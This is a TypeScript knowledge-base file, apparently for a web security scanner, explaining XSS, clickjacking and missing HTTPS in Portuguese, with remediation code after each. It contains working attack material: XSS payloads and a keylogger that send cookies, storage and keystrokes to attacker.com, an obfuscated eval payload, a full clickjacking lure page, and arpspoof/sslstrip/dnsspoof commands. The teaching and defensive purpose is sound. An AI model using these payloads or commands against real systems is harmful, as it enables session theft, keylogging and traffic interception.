import {
  ExploitDetails,
  VulnerabilityImpact,
  Remediation,
  VulnerabilityReferences,
  VulnerabilityType,
} from '@/types/scan';

export interface VulnerabilityKnowledge {
  exploitDetails: ExploitDetails;
  impact: VulnerabilityImpact;
  remediation: Remediation;
  references: VulnerabilityReferences;
}

export const XSS_KNOWLEDGE: VulnerabilityKnowledge = {
  exploitDetails: {
    howHackersExploit: `Hackers exploram XSS (Cross-Site Scripting) injetando scripts maliciosos em páginas web. Sem Content-Security-Policy (CSP), o navegador executa qualquer script sem restrições.

PASSO A PASSO DO ATAQUE:
1. Hacker identifica campo de entrada sem validação (formulários, URLs, comentários)
2. Injeta payload malicioso: <script>fetch('https://evil.com?cookie='+document.cookie)</script>
3. Vítima acessa a página contendo o script injetado
4. Script executa no navegador da vítima e rouba cookies/sessões
5. Hacker usa sessão roubada para acessar conta da vítima

O ataque pode ser:
• Reflected XSS: Script vem da URL e é refletido imediatamente
• Stored XSS: Script é armazenado no banco de dados
• DOM-based XSS: Manipulação do DOM via JavaScript`,
    attackScenario: `CENÁRIO REAL DE ATAQUE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 Alvo: Loja online sem CSP
🔴 Vetor: Campo de comentário de produto
👤 Vítima: Qualquer usuário que visualizar o comentário
💥 Resultado: Roubo de tokens de sessão, redirecionamento para phishing

O QUE O HACKER PODE FAZER:
• Roubar credenciais de login em tempo real
• Modificar conteúdo da página (defacement)
• Redirecionar para sites de phishing
• Instalar keyloggers no navegador
• Realizar ações em nome do usuário (compras, transferências)
• Capturar dados de cartão de crédito
• Espalhar malware`,
    exploitComplexity: 'LOW',
    requiredSkills: [
      'JavaScript básico',
      'HTML/DOM manipulation',
      'Conhecimento de HTTP',
      'Técnicas de bypass de filtros',
    ],
    commonTools: [
      'Burp Suite - Scanner de vulnerabilidades profissional',
      'OWASP ZAP - Proxy de interceptação open-source',
      'XSStrike - Ferramenta especializada em XSS',
      'Browser DevTools - Console do navegador',
      'BeEF (Browser Exploitation Framework) - Framework de exploração',
      'XSSer - Automated XSS detection',
    ],
    exploitExample: `// ═══════════════════════════════════════════════════════
// EXEMPLOS DE PAYLOADS XSS
// ═══════════════════════════════════════════════════════

// 1. Payload XSS Básico (teste)
<script>alert('XSS Vulnerável!')</script>

// 2. Roubo de Cookies (ataque real)
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      localStorage: JSON.stringify(localStorage),
      sessionStorage: JSON.stringify(sessionStorage),
      url: window.location.href,
      userAgent: navigator.userAgent
    })
  });
</script>

// 3. Keylogger (captura tudo que o usuário digita)
<script>
  document.addEventListener('keypress', (e) => {
    fetch('https://attacker.com/log', {
      method: 'POST',
      body: JSON.stringify({
        key: e.key,
        target: e.target.name,
        page: location.href
      })
    });
  });
</script>

// 4. Payload Ofuscado (bypass de filtros)
<img src=x onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))">

// 5. DOM-based XSS
<script>
  const params = new URLSearchParams(location.search);
  document.write(params.get('name')); // PERIGOSO!
</script>

// 6. Redirecionamento para Phishing
<script>
  if(document.cookie.includes('session')) {
    window.location = 'https://fake-bank.com/login?redirect=' + 
                      encodeURIComponent(location.href);
  }
</script>`,
  },

  impact: {
    confidentiality: 'HIGH',
    integrity: 'HIGH',
    availability: 'LOW',
    businessImpact: `IMPACTO NO NEGÓCIO:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 Financeiro:
   • Perda de receita por abandono de clientes (67% não voltam)
   • Custos de resposta a incidentes (R$ 50.000 - R$ 500.000)
   • Multas LGPD: até 2% do faturamento (máx R$ 50 milhões)
   • Ações judiciais de clientes afetados

🏢 Reputacional:
   • Danos irreversíveis à marca
   • Perda de confiança do mercado
   • Queda no valor das ações (empresas públicas)
   • Dificuldade em atrair novos clientes

⚖️ Legal/Regulatório:
   • Violação da LGPD (Lei Geral de Proteção de Dados)
   • Notificação obrigatória à ANPD
   • Possível suspensão das atividades
   • Responsabilização criminal dos gestores`,
    dataAtRisk: [
      'Tokens de sessão e autenticação',
      'Cookies com dados sensíveis',
      'Dados pessoais dos usuários (CPF, email, telefone)',
      'Informações de pagamento e cartões',
      'Credenciais de login',
      'Dados bancários',
      'Histórico de navegação',
      'Informações confidenciais da empresa',
    ],
    potentialDamage: 'Comprometimento total da conta do usuário, roubo de identidade, fraude financeira, vazamento massivo de dados, e possível acesso a sistemas internos da empresa.',
  },

  remediation: {
    quickFix: "Adicionar header: Content-Security-Policy: default-src 'self'; script-src 'self'",
    completeFixSteps: [
      '1. Implementar Content-Security-Policy (CSP) restritivo no servidor',
      '2. Validar e sanitizar TODAS as entradas do usuário (backend)',
      '3. Usar encoding apropriado na saída (HTML entities, URL encoding)',
      '4. Implementar HttpOnly e Secure em todos os cookies',
      '5. Usar frameworks com proteção XSS built-in (React auto-escaping)',
      '6. Implementar WAF (Web Application Firewall)',
      '7. Realizar testes de penetração regulares',
      '8. Treinar equipe de desenvolvimento sobre segurança',
      '9. Implementar Content-Type correto (X-Content-Type-Options: nosniff)',
      '10. Revisar e atualizar dependências regularmente',
    ],
    codeExamples: [
      {
        language: 'nginx',
        label: 'Configuração Nginx',
        before: `# ❌ SEM PROTEÇÃO - VULNERÁVEL
server {
    listen 80;
    server_name example.com;
    
    location / {
        proxy_pass http://backend:3000;
    }
}`,
        after: `# ✅ COM PROTEÇÃO COMPLETA
server {
    listen 443 ssl http2;
    server_name example.com;
    
    # CSP Restritivo
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';" always;
    
    # Headers de Segurança Adicionais
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    
    location / {
        proxy_pass http://backend:3000;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}`,
      },
      {
        language: 'node-express',
        label: 'Node.js + Express',
        before: `// ❌ CÓDIGO VULNERÁVEL
const express = require('express');
const app = express();

app.get('/search', (req, res) => {
  const query = req.query.q;
  // PERIGOSO: Renderiza input direto sem sanitização
  res.send(\`<h1>Resultados para: \${query}</h1>\`);
});

app.get('/comment', (req, res) => {
  const comment = req.body.comment;
  // PERIGOSO: Salva no banco sem validação
  db.save({ comment });
});`,
        after: `// ✅ CÓDIGO SEGURO
const express = require('express');
const helmet = require('helmet');
const xss = require('xss');
const validator = require('validator');

const app = express();

// Helmet configura headers de segurança automaticamente
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
    },
  },
  xssFilter: true,
  noSniff: true,
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' }
}));

// Middleware de sanitização
const sanitizeInput = (req, res, next) => {
  if (req.body) {
    Object.keys(req.body).forEach(key => {
      if (typeof req.body[key] === 'string') {
        req.body[key] = xss(req.body[key]);
      }
    });
  }
  if (req.query) {
    Object.keys(req.query).forEach(key => {
      if (typeof req.query[key] === 'string') {
        req.query[key] = xss(req.query[key]);
      }
    });
  }
  next();
};

app.use(sanitizeInput);

app.get('/search', (req, res) => {
  const query = validator.escape(req.query.q || '');
  // Usa template engine que escapa automaticamente
  res.render('search', { query });
});

app.post('/comment', (req, res) => {
  const comment = xss(req.body.comment);
  
  // Validação adicional
  if (!validator.isLength(comment, { min: 1, max: 1000 })) {
    return res.status(400).json({ error: 'Comentário inválido' });
  }
  
  db.save({ comment });
  res.json({ success: true });
});`,
      },
      {
        language: 'react',
        label: 'React (Frontend)',
        before: `// ❌ VULNERÁVEL - Usando dangerouslySetInnerHTML
function Comment({ text }) {
  return (
    <div dangerouslySetInnerHTML={{ __html: text }} />
  );
}

// ❌ VULNERÁVEL - Manipulação direta do DOM
function SearchResults({ query }) {
  useEffect(() => {
    document.getElementById('results').innerHTML = 
      \`<h1>Resultados para: \${query}</h1>\`;
  }, [query]);
  
  return <div id="results" />;
}`,
        after: `// ✅ SEGURO - React escapa automaticamente
import DOMPurify from 'dompurify';

function Comment({ text }) {
  // React escapa automaticamente
  return <div>{text}</div>;
}

// Se REALMENTE precisar renderizar HTML, sanitize primeiro
function RichComment({ html }) {
  const sanitized = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
  });
  
  return (
    <div dangerouslySetInnerHTML={{ __html: sanitized }} />
  );
}

function SearchResults({ query }) {
  // React escapa automaticamente
  return (
    <div>
      <h1>Resultados para: {query}</h1>
    </div>
  );
}`,
      },
    ],
    testingSteps: [
      '1. Usar OWASP ZAP para scan automatizado completo',
      '2. Testar payloads XSS manualmente em todos os campos: <script>alert(1)</script>',
      '3. Verificar se CSP está ativo abrindo DevTools > Console',
      '4. Testar payloads ofuscados: <img src=x onerror="alert(1)">',
      '5. Testar diferentes encodings (URL, HTML, Unicode, Base64)',
      '6. Validar CSP com https://csp-evaluator.withgoogle.com/',
      '7. Realizar code review focado em pontos de entrada de dados',
      '8. Testar com Burp Suite Intruder usando wordlist de XSS',
      '9. Verificar se cookies têm flags HttpOnly e Secure',
      '10. Contratar pentest profissional anualmente',
    ],
    preventionTips: [
      '• NUNCA confie em dados do usuário - valide TUDO',
      '• Use Content Security Policy (CSP) em modo strict',
      '• Implemente validação no backend E frontend (defesa em profundidade)',
      '• Use bibliotecas de sanitização (DOMPurify, xss, validator)',
      '• Prefira frameworks com auto-escaping (React, Vue, Angular)',
      '• Configure HttpOnly e Secure em TODOS os cookies',
      '• Implemente rate limiting para prevenir ataques automatizados',
      '• Mantenha dependências atualizadas (npm audit, Snyk)',
      '• Use HTTPS em 100% do site (HSTS)',
      '• Implemente WAF (Web Application Firewall)',
      '• Realize treinamentos regulares da equipe',
      '• Faça code reviews focados em segurança',
    ],
  },

  references: {
    owaspLinks: [
      'https://owasp.org/www-community/attacks/xss/',
      'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
      'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting',
      'https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html',
    ],
    articles: [
      'https://portswigger.net/web-security/cross-site-scripting',
      'https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#cross-site_scripting_xss',
      'https://www.acunetix.com/websitesecurity/cross-site-scripting/',
      'https://excess-xss.com/',
    ],
    videos: [
      'https://www.youtube.com/watch?v=L5l9lSnNMxg',
      'https://www.youtube.com/watch?v=EoaDgUgS6QA',
    ],
    realWorldCases: [
      {
        company: 'British Airways',
        year: 2018,
        summary: 'XSS no site permitiu roubo de dados de 380.000 clientes incluindo cartões de crédito. Multa: £20 milhões (GDPR)',
        link: 'https://www.bbc.com/news/technology-54568784',
      },
      {
        company: 'eBay',
        year: 2016,
        summary: 'Vulnerabilidade XSS permitiu phishing em páginas legítimas do eBay, afetando milhões de usuários',
        link: 'https://www.zdnet.com/article/ebay-xss-flaw-exploited-in-the-wild/',
      },
      {
        company: 'Fortnite',
        year: 2019,
        summary: 'XSS permitiu acesso a contas de jogadores e roubo de V-Bucks (moeda virtual)',
        link: 'https://www.theverge.com/2019/1/16/18185915/fortnite-security-vulnerability-hackers',
      },
    ],
  },
};

export const CLICKJACKING_KNOWLEDGE: VulnerabilityKnowledge = {
  exploitDetails: {
    howHackersExploit: `Clickjacking (UI Redressing) é um ataque onde o hacker engana o usuário para clicar em algo diferente do que ele pensa que está clicando.

PASSO A PASSO DO ATAQUE:
1. Hacker cria site malicioso que carrega seu site em um iframe invisível
2. Sobrepõe elementos visuais enganosos sobre o iframe
3. Vítima pensa que está clicando em um botão legítimo
4. Na realidade, está clicando em ações no seu site (transferências, exclusões, etc)
5. Ações são executadas com as credenciais da vítima

TÉCNICAS UTILIZADAS:
• Iframe invisível com opacity: 0
• Posicionamento CSS absoluto para sobrepor elementos
• Cursor personalizado para esconder o clique real
• Drag & drop attacks para arrastar dados sensíveis`,
    attackScenario: `CENÁRIO REAL DE ATAQUE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 Alvo: Banco online sem X-Frame-Options
🔴 Vetor: Site malicioso com iframe invisível
👤 Vítima: Cliente do banco que acessa site malicioso
💥 Resultado: Transferência bancária não autorizada

FLUXO DO ATAQUE:
1. Vítima recebe email: "Ganhe iPhone grátis - Clique aqui!"
2. Site malicioso carrega banco em iframe invisível
3. Sobrepõe botão "Ganhar iPhone" sobre botão "Confirmar Transferência"
4. Vítima clica pensando que vai ganhar iPhone
5. Na realidade, confirma transferência de R$ 10.000 para conta do hacker

OUTROS CENÁRIOS:
• Curtir páginas no Facebook sem saber
• Seguir contas no Twitter automaticamente
• Autorizar permissões de aplicativos
• Deletar conta ou dados importantes
• Alterar configurações de privacidade`,
    exploitComplexity: 'MEDIUM',
    requiredSkills: [
      'HTML/CSS avançado',
      'JavaScript',
      'Engenharia social',
      'Conhecimento de posicionamento CSS',
    ],
    commonTools: [
      'Browser DevTools - Para ajustar posicionamento',
      'Burp Suite - Para testar proteções',
      'Social Engineering Toolkit - Para criar páginas falsas',
      'BeEF - Browser Exploitation Framework',
    ],
    exploitExample: `<!-- ═══════════════════════════════════════════════════════ -->
<!-- EXEMPLO DE ATAQUE CLICKJACKING -->
<!-- ═══════════════════════════════════════════════════════ -->

<!DOCTYPE html>
<html>
<head>
  <title>Ganhe um iPhone 15 Pro GRÁTIS!</title>
  <style>
    /* Página falsa atraente */
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    }
    
    .fake-button {
      background: #ff6b6b;
      color: white;
      padding: 20px 40px;
      font-size: 24px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      position: relative;
      z-index: 1;
    }
    
    /* Iframe invisível do site real */
    .victim-site {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      opacity: 0; /* INVISÍVEL! */
      z-index: 2; /* Acima do botão falso */
      pointer-events: auto;
    }
    
    /* Posiciona iframe para que botão real fique sobre o falso */
    .iframe-container {
      position: relative;
      width: 100%;
      height: 600px;
    }
  </style>
</head>
<body>
  <h1>🎁 PARABÉNS! Você ganhou um iPhone 15 Pro!</h1>
  <p>Clique no botão abaixo para resgatar seu prêmio:</p>
  
  <div class="iframe-container">
    <!-- Botão falso que o usuário VÊ -->
    <button class="fake-button">
      🎉 RESGATAR MEU iPHONE GRÁTIS! 🎉
    </button>
    
    <!-- Iframe invisível com site real -->
    <!-- O botão REAL de transferência fica exatamente sobre o falso -->
    <iframe 
      class="victim-site"
      src="https://banco-vitima.com/transferencia?valor=10000&conta=hacker"
    ></iframe>
  </div>
  
  <script>
    // Ajusta posição do iframe dinamicamente
    window.addEventListener('load', () => {
      const iframe = document.querySelector('.victim-site');
      // Posiciona para que botão "Confirmar" do banco
      // fique exatamente sobre o botão falso
      iframe.style.top = '-350px'; // Ajuste fino
      iframe.style.left = '0px';
    });
  </script>
</body>
</html>

<!-- ═══════════════════════════════════════════════════════ -->
<!-- VARIAÇÃO: Double Clickjacking -->
<!-- ═══════════════════════════════════════════════════════ -->

<style>
  /* Primeiro clique: Foca no iframe */
  /* Segundo clique: Executa ação */
  .double-click-trap {
    position: absolute;
    width: 100%;
    height: 100%;
    z-index: 999;
  }
</style>

<div onclick="this.style.display='none'">
  Clique aqui para continuar...
</div>
<iframe class="victim-site" src="https://vitima.com/delete-account"></iframe>`,
  },

  impact: {
    confidentiality: 'MEDIUM',
    integrity: 'HIGH',
    availability: 'LOW',
    businessImpact: `IMPACTO NO NEGÓCIO:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 Financeiro:
   • Fraudes financeiras (transferências não autorizadas)
   • Custos de reembolso a clientes afetados
   • Multas por falha de segurança
   • Perda de clientes (25-40% não voltam)

🏢 Reputacional:
   • Perda de confiança dos usuários
   • Má publicidade em redes sociais
   • Danos à imagem da marca
   • Perda de vantagem competitiva

⚖️ Legal:
   • Responsabilidade por danos causados
   • Violação de regulamentações (LGPD, PCI-DSS)
   • Possíveis processos judiciais`,
    dataAtRisk: [
      'Ações do usuário (cliques não autorizados)',
      'Configurações de conta',
      'Autorizações de aplicativos',
      'Dados de pagamento',
      'Informações de perfil',
    ],
    potentialDamage: 'Execução de ações não autorizadas em nome do usuário, incluindo transferências financeiras, exclusão de dados, alteração de configurações críticas e autorização de acessos maliciosos.',
  },

  remediation: {
    quickFix: "Adicionar header: X-Frame-Options: DENY ou frame-ancestors 'none' no CSP",
    completeFixSteps: [
      '1. Implementar X-Frame-Options: DENY (ou SAMEORIGIN se precisar de iframes)',
      '2. Adicionar frame-ancestors no Content-Security-Policy',
      '3. Implementar JavaScript frame-busting como camada adicional',
      '4. Usar SameSite cookies para prevenir CSRF relacionado',
      '5. Implementar confirmação dupla para ações críticas',
      '6. Adicionar CAPTCHA em operações sensíveis',
      '7. Testar em todos os navegadores',
      '8. Monitorar tentativas de embedding',
    ],
    codeExamples: [
      {
        language: 'nginx',
        label: 'Configuração Nginx',
        before: `# ❌ SEM PROTEÇÃO
server {
    listen 443 ssl;
    server_name banco.com;
    
    location / {
        proxy_pass http://backend;
    }
}`,
        after: `# ✅ COM PROTEÇÃO COMPLETA
server {
    listen 443 ssl;
    server_name banco.com;
    
    # Previne embedding em iframes
    add_header X-Frame-Options "DENY" always;
    
    # CSP com frame-ancestors
    add_header Content-Security-Policy "frame-ancestors 'none';" always;
    
    # Cookies com SameSite
    proxy_cookie_path / "/; SameSite=Strict; Secure; HttpOnly";
    
    location / {
        proxy_pass http://backend;
    }
}`,
      },
      {
        language: 'node-express',
        label: 'Node.js + Express',
        before: `// ❌ SEM PROTEÇÃO
const express = require('express');
const app = express();

app.get('/transfer', (req, res) => {
  // Vulnerável a clickjacking
  res.render('transfer');
});`,
        after: `// ✅ COM PROTEÇÃO
const express = require('express');
const helmet = require('helmet');
const app = express();

// Helmet configura X-Frame-Options automaticamente
app.use(helmet.frameguard({ action: 'deny' }));

// CSP adicional
app.use(helmet.contentSecurityPolicy({
  directives: {
    frameAncestors: ["'none'"],
    defaultSrc: ["'self'"],
  },
}));

// Cookies com SameSite
app.use(require('cookie-session')({
  name: 'session',
  secret: process.env.SESSION_SECRET,
  sameSite: 'strict',
  secure: true,
  httpOnly: true,
}));

app.get('/transfer', (req, res) => {
  res.render('transfer');
});`,
      },
      {
        language: 'javascript',
        label: 'Frame-Busting Script (Camada Adicional)',
        after: `// ✅ JavaScript Frame-Busting
// Adicione no <head> de páginas sensíveis

<script>
  // Detecta se está em iframe
  if (window.top !== window.self) {
    // Tenta quebrar o iframe
    window.top.location = window.self.location;
    
    // Se não conseguir, esconde conteúdo
    document.body.style.display = 'none';
    
    // Alerta o usuário
    alert('Por segurança, esta página não pode ser exibida em frames.');
  }
  
  // Proteção adicional contra remoção do script
  Object.defineProperty(window, 'top', {
    get: function() {
      return window.self;
    },
    configurable: false
  });
</script>

<!-- Fallback CSS -->
<style>
  /* Esconde conteúdo se JavaScript estiver desabilitado */
  html {
    display: none;
  }
</style>
<script>
  // Mostra apenas se não estiver em iframe
  if (window.top === window.self) {
    document.documentElement.style.display = 'block';
  }
</script>`,
      },
    ],
    testingSteps: [
      '1. Criar página HTML simples tentando carregar seu site em iframe',
      '2. Verificar se o iframe é bloqueado ou mostra erro',
      '3. Testar em diferentes navegadores (Chrome, Firefox, Safari, Edge)',
      '4. Usar Burp Suite para verificar headers na resposta',
      '5. Testar com diferentes valores de X-Frame-Options',
      '6. Verificar se CSP frame-ancestors está ativo',
      '7. Testar bypass com JavaScript desabilitado',
      '8. Usar ferramentas online: https://clickjacker.io/',
    ],
    preventionTips: [
      '• Use X-Frame-Options: DENY para máxima segurança',
      '• Se precisar de iframes legítimos, use SAMEORIGIN',
      '• Implemente frame-ancestors no CSP (mais moderno)',
      '• Adicione frame-busting JavaScript como defesa em profundidade',
      '• Use SameSite=Strict em cookies',
      '• Implemente confirmação dupla para ações críticas',
      '• Adicione CAPTCHA em operações sensíveis',
      '• Monitore tentativas de embedding com analytics',
      '• Eduque usuários sobre phishing e sites suspeitos',
      '• Teste regularmente com ferramentas automatizadas',
    ],
  },

  references: {
    owaspLinks: [
      'https://owasp.org/www-community/attacks/Clickjacking',
      'https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html',
    ],
    articles: [
      'https://portswigger.net/web-security/clickjacking',
      'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options',
      'https://www.acunetix.com/blog/web-security-zone/what-is-clickjacking/',
    ],
    realWorldCases: [
      {
        company: 'Twitter',
        year: 2009,
        summary: 'Clickjacking permitiu que atacantes fizessem usuários seguirem contas maliciosas sem saber',
        link: 'https://blog.twitter.com/engineering/en_us/a/2009/clickjacking',
      },
      {
        company: 'Facebook',
        year: 2010,
        summary: 'Ataque de clickjacking permitiu curtidas automáticas em páginas maliciosas',
      },
    ],
  },
};

export const SSL_KNOWLEDGE: VulnerabilityKnowledge = {
  exploitDetails: {
    howHackersExploit: `Sem HTTPS/SSL, todo o tráfego entre usuário e servidor é transmitido em TEXTO PLANO. Hackers podem interceptar e ler/modificar todos os dados.

PASSO A PASSO DO ATAQUE (Man-in-the-Middle):
1. Hacker se posiciona entre vítima e servidor (WiFi público, roteador comprometido)
2. Intercepta todo o tráfego HTTP usando ferramentas de sniffing
3. Captura credenciais, cookies, dados de formulários em texto plano
4. Pode modificar respostas do servidor (injetar malware, phishing)
5. Vítima não percebe que está sendo espionada

TÉCNICAS DE ATAQUE:
• ARP Spoofing: Engana dispositivos na rede local
• DNS Spoofing: Redireciona para servidor falso
• SSL Stripping: Force downgrade de HTTPS para HTTP
• Rogue Access Point: WiFi falso que imita rede legítima`,
    attackScenario: `CENÁRIO REAL DE ATAQUE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 Alvo: Site de e-commerce sem HTTPS
🔴 Vetor: WiFi público de aeroporto
👤 Vítima: Cliente fazendo compra online
💥 Resultado: Roubo de dados de cartão de crédito

FLUXO DO ATAQUE:
1. Vítima conecta no "WiFi Grátis Aeroporto" (criado pelo hacker)
2. Acessa loja online via HTTP
3. Hacker intercepta tráfego com Wireshark
4. Captura em texto plano:
   - Login: usuario@email.com
   - Senha: senha123
   - Cartão: 1234 5678 9012 3456
   - CVV: 123
   - Endereço completo
5. Hacker usa dados para compras fraudulentas

O QUE PODE SER CAPTURADO:
• Credenciais de login (usuário/senha)
• Tokens de sessão (sequestro de conta)
• Dados de cartão de crédito
• Informações pessoais (CPF, RG, endereço)
• Emails e mensagens
• Histórico de navegação completo
• Cookies de autenticação`,
    exploitComplexity: 'LOW',
    requiredSkills: [
      'Conhecimento básico de redes',
      'Uso de ferramentas de sniffing',
      'Configuração de proxy',
    ],
    commonTools: [
      'Wireshark - Captura e análise de pacotes',
      'Ettercap - MITM attack framework',
      'SSLStrip - Force downgrade HTTPS → HTTP',
      'Bettercap - Network attack framework moderno',
      'mitmproxy - Proxy interativo para MITM',
      'Aircrack-ng - WiFi hacking suite',
    ],
    exploitExample: `# ═══════════════════════════════════════════════════════
# EXEMPLO DE ATAQUE MAN-IN-THE-MIDDLE
# ═══════════════════════════════════════════════════════

# 1. Configurar máquina como router (IP forwarding)
echo 1 > /proc/sys/net/ipv4/ip_forward

# 2. ARP Spoofing - Enganar vítima e gateway
# Diz para vítima que você é o gateway
# Diz para gateway que você é a vítima
arpspoof -i wlan0 -t 192.168.1.100 192.168.1.1 &
arpspoof -i wlan0 -t 192.168.1.1 192.168.1.100 &

# 3. SSL Strip - Force downgrade HTTPS → HTTP
sslstrip -l 8080 &

# 4. Redirecionar tráfego HTTP para SSLStrip
iptables -t nat -A PREROUTING -p tcp --destination-port 80 \\
  -j REDIRECT --to-port 8080

# 5. Capturar tráfego com Wireshark
wireshark -i wlan0 -k -f "host 192.168.1.100"

# ═══════════════════════════════════════════════════════
# O QUE O HACKER VÊ (tráfego HTTP capturado):
# ═══════════════════════════════════════════════════════

POST /login HTTP/1.1
Host: loja-vulneravel.com
Content-Type: application/x-www-form-urlencoded

email=vitima@email.com&senha=senha123

---

POST /checkout HTTP/1.1
Host: loja-vulneravel.com
Cookie: session=abc123xyz

cardNumber=1234567890123456&
cvv=123&
expiry=12/25&
name=João Silva&
cpf=12345678900

# ═══════════════════════════════════════════════════════
# ATAQUE AVANÇADO: SSL Strip com DNS Spoofing
# ═══════════════════════════════════════════════════════

# Cria servidor DNS falso
dnsspoof -i wlan0 -f hosts.txt

# hosts.txt:
# banco.com.br 192.168.1.50  # IP do hacker
# *.banco.com.br 192.168.1.50

# Servidor falso responde em HTTP (sem SSL)
# Usuário vê: http://banco.com.br (sem cadeado)
# Mas pode não perceber!`,
  },

  impact: {
    confidentiality: 'HIGH',
    integrity: 'HIGH',
    availability: 'MEDIUM',
    businessImpact: `IMPACTO NO NEGÓCIO:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 Financeiro:
   • Fraudes com cartões roubados (chargeback)
   • Multas PCI-DSS: até US$ 500.000/mês
   • Multas LGPD: até R$ 50 milhões
   • Indenizações a clientes afetados
   • Perda de 80-90% dos clientes

🏢 Reputacional:
   • Danos IRREVERSÍVEIS à marca
   • Perda total de confiança do mercado
   • Impossibilidade de processar pagamentos online
   • Exclusão de marketplaces e parceiros

⚖️ Legal:
   • Violação de múltiplas regulamentações
   • Suspensão das operações online
   • Responsabilização criminal dos gestores
   • Processos judiciais massivos

🔒 Técnico:
   • Penalização no Google (ranking menor)
   • Avisos de "Site não seguro" em navegadores
   • Bloqueio por antivírus e firewalls`,
    dataAtRisk: [
      'TODOS os dados transmitidos:',
      '• Credenciais de login',
      '• Dados de cartão de crédito',
      '• CPF, RG, documentos',
      '• Endereços e telefones',
      '• Emails e mensagens',
      '• Histórico completo de navegação',
      '• Tokens de sessão',
      '• Dados bancários',
      '• Informações médicas',
      '• Dados empresariais confidenciais',
    ],
    potentialDamage: 'COMPROMETIMENTO TOTAL de todos os dados transmitidos. Roubo de identidade, fraude financeira massiva, vazamento de dados sensíveis, perda total de confiança, falência do negócio.',
  },

  remediation: {
    quickFix: 'Adquirir certificado SSL/TLS (Let\'s Encrypt gratuito) e configurar HTTPS',
    completeFixSteps: [
      '1. Adquirir certificado SSL/TLS (Let\'s Encrypt é gratuito)',
      '2. Instalar certificado no servidor web',
      '3. Configurar servidor para responder em HTTPS (porta 443)',
      '4. Redirecionar TODO tráfego HTTP → HTTPS (301 redirect)',
      '5. Implementar HSTS (HTTP Strict Transport Security)',
      '6. Configurar TLS 1.2+ (desabilitar SSLv3, TLS 1.0, TLS 1.1)',
      '7. Usar ciphers seguros (desabilitar RC4, 3DES)',
      '8. Implementar OCSP Stapling',
      '9. Configurar cookies com flags Secure',
      '10. Testar com SSL Labs: https://www.ssllabs.com/ssltest/',
      '11. Monitorar validade do certificado',
      '12. Configurar renovação automática',
    ],
    codeExamples: [
      {
        language: 'nginx',
        label: 'Configuração Nginx Completa',
        before: `# ❌ CONFIGURAÇÃO INSEGURA (HTTP)
server {
    listen 80;
    server_name loja.com;
    
    location / {
        proxy_pass http://backend:3000;
    }
}`,
        after: `# ✅ CONFIGURAÇÃO SEGURA (HTTPS)
# Redireciona HTTP → HTTPS
server {
    listen 80;
    server_name loja.com www.loja.com;
    return 301 https://loja.com$request_uri;
}

# Servidor HTTPS
server {
    listen 443 ssl http2;
    server_name loja.com www.loja.com;
    
    # Certificado SSL
    ssl_certificate /etc/letsencrypt/live/loja.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/loja.com/privkey.pem;
    
    # Protocolos seguros (TLS 1.2 e 1.3)
    ssl_protocols TLSv1.2 TLSv1.3;
    
    # Ciphers seguros
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
    ssl_prefer_server_ciphers on;
    
    # HSTS (força HTTPS por 2 anos)
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
    
    # OCSP Stapling
    ssl_stapling on;
    ssl_stapling_verify on;
    ssl_trusted_certificate /etc/letsencrypt/live/loja.com/chain.pem;
    
    # Session cache
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 10m;
    
    # Headers de segurança
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    
    location / {
        proxy_pass http://backend:3000;
        proxy_set_header X-Forwarded-Proto https;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}`,
      },
      {
        language: 'apache',
        label: 'Configuração Apache',
        before: `# ❌ INSEGURO
<VirtualHost *:80>
    ServerName loja.com
